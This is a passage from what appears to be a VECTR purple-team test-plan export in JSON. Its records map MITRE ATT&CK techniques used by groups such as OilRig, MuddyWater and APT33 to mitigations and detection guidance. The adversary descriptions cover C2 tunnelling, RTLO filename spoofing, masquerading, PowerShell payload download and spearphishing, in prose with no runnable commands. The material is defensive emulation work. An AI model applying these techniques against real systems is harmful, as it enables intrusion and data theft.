name.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1","relationship--9c5c8dbe-ec34-46f9-b4af-0a6e73f00c89","relationship--c28d6f10-431f-493c-8abd-918240c5c970","course-of-action--c620e3a1-fff5-424f-abea-d2b0f3616f67","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html","Amazon. (n.d.). What Is AWS Application Discovery Service?. Retrieved October 8, 2019. https://docs.aws.amazon.com/en_pv/application-discovery/latest/userguide/what-is-appdiscovery.html","Google. (2019, October 3). Quickstart: Using the dashboard. Retrieved October 8, 2019. https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019. https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get"],"mitreId":"T1082"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--20f661a5-3421-4036-88e0-ff423c618f21","vectrId":"20f661a5-3421-4036-88e0-ff423c618f21","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"866d6b69-3f03-4c88-bf51-679a0e4cab74","templateId":"20f661a5-3421-4036-88e0-ff423c618f21","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Remote Services","variant":"OilRig - Remote Services","objective":"An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used Putty to access compromised systems.Limit the accounts that may use remote services. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs.\n---\nUse multi-factor authentication on remote service logons where possible.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba","relationship--bd83109f-198a-43b0-a4c9-c13dd671c2da","relationship--2c0fe330-edcf-4519-a577-c3c9b086d60a","course-of-action--979e6485-7a2f-42bd-ae96-4e622c3cd173","relationship--795ca238-c8cf-4735-98cc-593f1cc59b16","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--a70d8d81-4d88-404c-81f3-c3ddd57d6b69","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/"],"mitreId":"T1021"},"blueTeam":{"successfulDetectionBehaviors":["Limit the number of accounts that may use remote services. Use multifactor authentication where possible. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs. Prevent Credential Access techniques that may allow an adversary to acquire [Valid Accounts](https://attack.mitre.org/techniques/T1078) that can be used by existing services.","Manage the creation, modification, use, and permissions associated to user accounts.","Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--20f68cab-24bf-4a15-8e45-b4dd82c56cde","vectrId":"20f68cab-24bf-4a15-8e45-b4dd82c56cde","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"20f68cab-24bf-4a15-8e45-b4dd82c56cde","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Data Compressed","variant":"APT33 - Data Compressed - Pupy - PoshC2 - Empire","objective":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)\n---\n[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1086). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has used WinRAR to compress data prior to exfil.\t\nNetwork intrusion prevention or data loss prevention tools may be set to block specific file types from leaving the network over unencrypted channels. An adversary may move to an encrypted channel or use other mechanisms of encapsulating the traffic in these situations.\n---\n[Pupy](https://attack.mitre.org/software/S0192) can compress data with Zip before sending it over C2.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) contains a module for compressing data using ZIP.\n---\n[Empire](https://attack.mitre.org/software/S0363) can ZIP directories on the target system.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["740b39a7-cf4c-4c2d-acf1-585754a5b04f","76ca4ddf-5174-57a7-2842-70d5af62a25c","5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4","relationship--1f48a517-c041-4845-9aba-2dce4f559b56","relationship--36a41a30-61ce-4c55-9916-0a572dfe6d36","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ea46cbd0-7134-4ede-a117-47380ddd9b5c","course-of-action--28adf6fd-ab6c-4553-9aa7-cef18a191f33","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--d1ee6feb-91cb-4cac-ae57-e71358af29c2","tool--4b57c098-f043-4da2-83ef-7588a6d426bc","relationship--617ce344-2317-433a-b283-8e67b90b00f7","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--32fc949c-2127-425b-9480-6d07ead49982","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Nettitude. (2018, July 23). Python Server for PoshC2. Retrieved April 23, 2019. https://github.com/nettitude/PoshC2_Python","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016. https://en.wikipedia.org/wiki/List_of_file_signatures"],"mitreId":"T1002"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--27bfb2bf-9a13-4478-ad89-bf000aeaaafa","vectrId":"27bfb2bf-9a13-4478-ad89-bf000aeaaafa","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"27bfb2bf-9a13-4478-ad89-bf000aeaaafa","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing Link","variant":"Magic Hound - Spearphishing Link","objective":"Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) sent shortened URL links over email to victims. The URLs linked to Word documents with malicious macros that execute PowerShells scripts to download Pupy.Users can be trained to identify social engineering techniques and spearphishing emails with malicious links.\n---\nDetermine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba","relationship--808f140e-8b7b-4efa-8708-2f2308b2fc41","relationship--1c04a87c-6a12-4aaa-8ead-30cd22d7850d","course-of-action--ad7f983d-d5a8-4fce-a38c-b68eda61bf4e","relationship--93669ebc-ea8d-4f76-94c8-4f8d1679b123","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--541884aa-9ee9-4241-b556-c7885c12102b","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Counter Threat Unit Research Team. (2017, July 27). The Curious Case of Mia Ash: Fake Persona Lures Middle Eastern Targets. Retrieved February 26, 2018. https://www.secureworks.com/research/the-curious-case-of-mia-ash","Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019. https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks"],"mitreId":"T1192"},"blueTeam":{"successfulDetectionBehaviors":["Because this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails with malicious links. Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk. Other mitigations can take place as [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--28e24300-48f3-4e48-a7fe-38f241927ca9","vectrId":"28e24300-48f3-4e48-a7fe-38f241927ca9","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"28e24300-48f3-4e48-a7fe-38f241927ca9","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Masquerading","variant":"MuddyWater - Masquerading","objective":"Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.\n\nOne variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous. An example of this is when a common system utility or program is moved and renamed to avoid detection based on its usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.\n\nA third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver file named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>. A common use of this technique is with spearphishing attachments since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default. \n\nAdversaries may modify a binary's metadata, including such fields as icons, version, name of the product, description, and copyright, to better blend in with the environment and increase chances of deceiving a security analyst or product.(Citation: Threatexpress MetaTwin 2017)\n\n### Windows\nIn another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)\n\nAn example of abuse of trusted locations in Windows would be the <code>C:\\Windows\\System32</code> directory. Examples of trusted binary names that can be given to malicious binares include \"explorer.exe\" and \"svchost.exe\".\n\n### Linux\nAnother variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. (Citation: Remaiten)\n\nAn example of abuse of trusted locations in Linux  would be the <code>/bin</code> directory. Examples of trusted binary names that can be given to malicious binaries include \"rsyncd\" and \"dbus-inotifier\". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used filenames and Registry key names associated with Windows Defender. The group has also stored obfuscated JavaScript code in an image file named temp.jpg.Use tools that restrict program execution via whitelisting by attributes other than file name for common operating system utilities that are needed.\n---\nRequire signed binaries.\n---\nUse file system access controls to protect folders such as C:\\\\Windows\\\\System32.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0","relationship--3e82234f-db7b-4a0f-8c0a-979b01381a6a","relationship--eb5ade8c-73e9-4b69-9dea-c8a8206dec25","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--61528841-379e-4fa3-a233-34c745764c18","course-of-action--45e7f570-6a0b-4095-bf02-4bca05da6bae","relationship--4fd3ec25-00ed-48c1-af72-e2523959860e","course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312","relationship--72de6e56-e5d1-4a3f-aa85-d7155f7ff42c","course-of-action--987988f0-cf86-4680-a875-2f6456ab2448","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html","Alintanahin, K.. (2014, May 23). PLEAD Targeted Attacks Against Taiwanese Government Agencies. Retrieved April 22, 2019. https://blog.trendmicro.com/trendlabs-security-intelligence/plead-targeted-attacks-against-taiwanese-government-agencies-2/","Bryan Lee and Rob Downs. (2016, February 12). A Look Into Fysbis: Sofacy’s Linux Backdoor. Retrieved September 10, 2017. https://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/","Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019. https://twitter.com/ItsReallyNick/status/1055321652777619457","ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf","Doctor Web. (2014, November 21). Linux.BackDoor.Fysbis.1. Retrieved December 7, 2017. https://vms.drweb.com/virus/?i=4276269","Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016. https://www.endgame.com/blog/how-hunt-masquerade-ball","F-Secure Labs. (2015, April 22). CozyDuke: Malware Analysis. Retrieved December 10, 2015. https://www.f-secure.com/documents/996508/1030745/CozyDuke","Firsh, A.. (2018, February 13). Zero-day vulnerability in Telegram - Cybercriminals exploited Telegram flaw to launch multipurpose attacks. Retrieved April 22, 2019. https://securelist.com/zero-day-vulnerability-in-telegram/83800/","Matsuda, A., Muhammad I. (2018, September 13). APT10 Targeting Japanese Corporations Using Updated TTPs. Retrieved September 17, 2018. https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html","Michal Malik AND Marc-Etienne M.Léveillé. (2016, March 30). Meet Remaiten – a Linux bot on steroids targeting routers and potentially other IoT devices. Retrieved September 7, 2017. https://www.welivesecurity.com/2016/03/30/meet-remaiten-a-linux-bot-on-steroids-targeting-routers-and-potentially-other-iot-devices/","Security Ninja. (2015, April 16). Spoof Using Right to Left Override (RTLO) Technique. Retrieved April 22, 2019. https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html","Vest, J. (2017, October 9). Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads. Retrieved September 10, 2019. https://threatexpress.com/blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/"],"mitreId":"T1036"},"blueTeam":{"successfulDetectionBehaviors":["Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.","Restrict access by setting directory and file permissions that are not specific to users or privileged accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--2ae04f18-b715-4480-a196-72c64b6dbb80","vectrId":"2ae04f18-b715-4480-a196-72c64b6dbb80","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"2ae04f18-b715-4480-a196-72c64b6dbb80","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Standard Application Layer Protocol","variant":"OilRig - Standard Application Layer Protocol","objective":"Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used HTTP and DNS for C2. The group has also used the Plink utility and other tools to create tunnels to C2 servers.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6","relationship--166326b3-6864-4667-aee9-4d7b24cc75d8","relationship--2a0b74b3-cbc3-45fa-aba4-eabdb0cb89b5","course-of-action--addb3703-5a59-4461-9bcd-7e2b5d4e92a0","relationship--19f35c88-92c4-4e98-b024-be9f6731bdb5","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34’s Invite to Join Their Professional Network. Retrieved August 26, 2019. https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/"],"mitreId":"T1071"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--2b43d5fd-64f9-42d3-8a63-f81f3f163bc0","vectrId":"2b43d5fd-64f9-42d3-8a63-f81f3f163bc0","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"2b43d5fd-64f9-42d3-8a63-f81f3f163bc0","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"PowerShell","variant":"OilRig - PowerShell","objective":"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. \n---\nSet PowerShell execution policy to execute only signed scripts. \n---\nIt may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.\n\nDisable/restrict the WinRM Service to help prevent uses of PowerShell for remote 